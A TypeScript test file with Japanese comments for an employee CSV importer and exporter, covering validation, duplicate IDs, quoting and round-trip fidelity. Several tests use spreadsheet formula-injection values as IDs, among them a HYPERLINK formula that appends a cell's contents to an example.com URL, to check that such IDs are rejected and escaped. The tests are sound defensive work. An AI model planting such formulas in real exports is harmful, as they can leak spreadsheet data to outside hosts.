// 設計書§11: CSV取込・バリデーションのテスト（node:test）

import { test } from 'node:test'
import assert from 'node:assert/strict'
import { importEmployees, mergeEmployees, buildAssignmentCsv } from '../src/renderer/csv.ts'
import { computeSimulationResult } from '../src/renderer/calcEngine.ts'
import type { Employee, UnitId } from '../src/renderer/types.ts'

const HEADER = '社員ID,営業力,管理力,開拓力,育成力,人件費'

function makeCsv(n: number): string {
  const lines = [HEADER]
  for (let i = 1; i <= n; i++) {
    lines.push(`E${String(i).padStart(3, '0')},60,55,50,45,10`)
  }
  return lines.join('\n')
}

test('importEmployees: 正常CSV（100名）を取り込める', () => {
  const { employees, errors } = importEmployees(makeCsv(100), 100)
  assert.equal(errors.length, 0)
  assert.ok(employees)
  assert.equal(employees!.length, 100)
  assert.deepEqual(employees![0], { id: 'E001', sales: 60, mgmt: 55, dev: 50, training: 45, cost: 10 })
})

test('importEmployees: 実データのヘッダ「社員番号」も取り込める', () => {
  const csv = ['社員番号,営業力,管理力,開拓力,育成力,人件費', 'E001,75,46,63,40,6.7'].join('\n')
  const { employees, errors } = importEmployees(csv, 1)
  assert.equal(errors.length, 0)
  assert.deepEqual(employees, [{ id: 'E001', sales: 75, mgmt: 46, dev: 63, training: 40, cost: 6.7 }])
})

test('importEmployees: BOM付きヘッダも取り込める', () => {
  const { employees, errors } = importEmployees('﻿' + makeCsv(100), 100)
  assert.equal(errors.length, 0)
  assert.ok(employees)
})

test('importEmployees: 範囲外（営業力108・人件費0）を検出', () => {
  const csv = [HEADER, 'E001,108,55,50,45,10', 'E002,60,55,50,45,0'].join('\n')
  const { employees, errors } = importEmployees(csv, 2)
  assert.equal(employees, null)
  assert.ok(errors.some((e) => e.row === 1 && e.column === '営業力'))
  assert.ok(errors.some((e) => e.row === 2 && e.column === '人件費'))
})

test('importEmployees: 件数不一致を検出', () => {
  const { errors } = importEmployees(makeCsv(99), 100)
  assert.ok(errors.some((e) => e.column === '(件数)'))
})

test('importEmployees: カラム不足を検出', () => {
  const csv = ['社員ID,営業力,管理力,開拓力,育成力', 'E001,60,55,50,45'].join('\n')
  const { employees, errors } = importEmployees(csv, 1)
  assert.equal(employees, null)
  assert.ok(errors.some((e) => e.expected.includes('人件費')))
})

test('importEmployees: 列数不揃い（ragged）を検出', () => {
  const csv = [HEADER, 'E001,60,55,50,45'].join('\n')
  const { errors } = importEmployees(csv, 1)
  assert.ok(errors.some((e) => e.column === '(行全体)'))
})

test('mergeEmployees: id衝突をエラー', () => {
  const base: Employee[] = [{ id: 'E001', sales: 1, mgmt: 1, dev: 1, training: 1, cost: 1 }]
  const add: Employee[] = [{ id: 'E001', sales: 2, mgmt: 2, dev: 2, training: 2, cost: 2 }]
  const { employees, errors } = mergeEmployees(base, add)
  assert.equal(employees, null)
  assert.equal(errors.length, 1)
})

test('mergeEmployees: 追加採用データ内の重複idをエラー', () => {
  const base: Employee[] = [{ id: 'E001', sales: 1, mgmt: 1, dev: 1, training: 1, cost: 1 }]
  const add: Employee[] = [
    { id: 'E101', sales: 2, mgmt: 2, dev: 2, training: 2, cost: 2 },
    { id: 'E101', sales: 3, mgmt: 3, dev: 3, training: 3, cost: 3 },
  ]
  const { employees, errors } = mergeEmployees(base, add)
  assert.equal(employees, null)
  assert.equal(errors.length, 1)
  assert.equal(errors[0].row, 2)
})

test('importEmployees: 社員番号の重複を検出', () => {
  const csv = [HEADER, 'E001,60,55,50,45,10', 'E001,60,55,50,45,10'].join('\n')
  const { employees, errors } = importEmployees(csv, 2)
  assert.equal(employees, null)
  assert.ok(errors.some((e) => e.row === 2 && e.column === '社員番号'))
})

test('importEmployees: クォート付きフィールド（カンマ・二重引用符を含む社員番号）を取り込める（RFC4180・B-6）', () => {
  const csv = [HEADER, '"E001,追加 ""special""",70,62,56,49,7.4'].join('\n')
  const { employees, errors } = importEmployees(csv, 1)
  assert.equal(errors.length, 0)
  assert.equal(employees?.[0].id, 'E001,追加 "special"')
})

test('importEmployees: クォート内にカンマを含む数式IDは1フィールドとして解釈された上で弾かれる（RFC4180・B-6）', () => {
  // パーサがクォートを理解していなければ「列数不一致」になる。
  // 「社員番号が不正」で止まることが、1フィールドとして正しく読めた証拠になる。
  const csv = [HEADER, '"=HYPERLINK(""http://example.com/""&A1,""click"")",70,62,56,49,7.4'].join('\n')
  const { employees, errors } = importEmployees(csv, 1)
  assert.equal(employees, null)
  assert.equal(errors.length, 1)
  assert.equal(errors[0].column, '社員番号')
  assert.equal(errors[0].actual, '=HYPERLINK("http://example.com/"&A1,"click")')
})

test('buildAssignmentCsv: フォーミュラインジェクション対象のIDには出力時に \' を前置する（B-6）', () => {
  const emps: Employee[] = [
    { id: '=1+1', sales: 70, mgmt: 60, dev: 55, training: 50, cost: 7 },
    { id: '+1+1', sales: 65, mgmt: 70, dev: 50, training: 45, cost: 7.3 },
    { id: '-1+1', sales: 68, mgmt: 55, dev: 62, training: 52, cost: 6.5 },
    { id: '@SUM(1+1)', sales: 75, mgmt: 60, dev: 58, training: 50, cost: 7.1 },
  ]
  const assign: Record<string, UnitId> = { '=1+1': 'A', '+1+1': 'A', '-1+1': 'A', '@SUM(1+1)': 'A' }
  const csv = buildAssignmentCsv(emps, computeSimulationResult(assign, emps))

  // 出力側：数式評価を防ぐため ' を前置してから表計算ソフトに渡す（多層防御として維持する）
  const lines = csv.split('\n')
  assert.ok(lines[1].startsWith("'=1+1,"))
  assert.ok(lines[2].startsWith("'+1+1,"))
  assert.ok(lines[3].startsWith("'-1+1,"))
  assert.ok(lines[4].startsWith("'@SUM(1+1),"))
})

test('importEmployees: 数式に見える社員番号は取込エラーにする', () => {
  // 数式に見えるIDは取込事故の典型なので、値を黙って受け入れず入力検証で報告する。
  // これにより `採用03_CSV数式インジェクション.csv` は「列数不一致」ではなく
  // 「社員番号が不正」という正しい理由で保留される。
  const csv = [HEADER, '=1+1,70,60,55,50,7', 'E002,70,60,55,50,7'].join('\n')
  const { employees, errors } = importEmployees(csv, 2)
  assert.equal(employees, null)
  const idErrors = errors.filter((e) => e.column === '社員番号')
  assert.equal(idErrors.length, 1)
  assert.equal(idErrors[0].row, 1)
  assert.equal(idErrors[0].actual, '=1+1')
})

test('importEmployees: 空の社員番号は取込エラーにする', () => {
  // id は assignment のキー。空だと複数人が同一キーに潰れて配置が壊れるため必ず弾く。
  const csv = [HEADER, ',70,60,55,50,7', '  ,70,60,55,50,7'].join('\n')
  const { employees, errors } = importEmployees(csv, 2)
  assert.equal(employees, null)
  assert.equal(errors.filter((e) => e.column === '社員番号' && e.actual === '(空)').length, 2)
})

test("buildAssignmentCsv → importEmployees: ' 始まりのIDが往復で欠けない", () => {
  // ガードを可逆にする前は、'=A1 が出力時にガード対象外と判定され、
  // 再取込で先頭の ' をガードと誤認して剥がされ =A1 に化けていた。
  const emps: Employee[] = [
    { id: "'=A1", sales: 70, mgmt: 60, dev: 55, training: 50, cost: 7 },
    { id: "'普通のID", sales: 65, mgmt: 70, dev: 50, training: 45, cost: 7.3 },
    { id: "'", sales: 68, mgmt: 55, dev: 62, training: 52, cost: 6.5 },
  ]
  const assign: Record<string, UnitId> = { "'=A1": 'A', "'普通のID": 'A', "'": 'A' }
  const csv = buildAssignmentCsv(emps, computeSimulationResult(assign, emps))
  const { employees: back, errors } = importEmployees(csv, emps.length)
  assert.equal(errors.length, 0)
  assert.deepEqual(
    back?.map((e) => e.id),
    emps.map((e) => e.id),
  )
})

test('buildAssignmentCsv → importEmployees: カンマ・引用符・改行を含む値が往復で保存される', () => {
  const emps: Employee[] = [{ id: 'A,B "C"\nD', sales: 70, mgmt: 60, dev: 55, training: 50, cost: 7 }]
  const assign: Record<string, UnitId> = { 'A,B "C"\nD': 'A' }
  const csv = buildAssignmentCsv(emps, computeSimulationResult(assign, emps))
  const { employees: back, errors } = importEmployees(csv, 1)
  assert.equal(errors.length, 0)
  assert.equal(back?.[0].id, 'A,B "C"\nD')
})

test('buildAssignmentCsv: ヘッダと配置先を含む', () => {
  const emps: Employee[] = [
    { id: 'E1', sales: 60, mgmt: 55, dev: 50, training: 45, cost: 10 },
    { id: 'E2', sales: 60, mgmt: 55, dev: 50, training: 45, cost: 10 },
  ]
  const assign: Record<string, UnitId> = { E1: 'A', E2: 'C' }
  const result = computeSimulationResult(assign, emps)
  const csv = buildAssignmentCsv(emps, result)
  const lines = csv.split('\n')
  assert.ok(lines[0].includes('配置先事業部'))
  assert.ok(lines[1].includes('A事業部'))
  assert.ok(lines[2].includes('C事業部'))
})
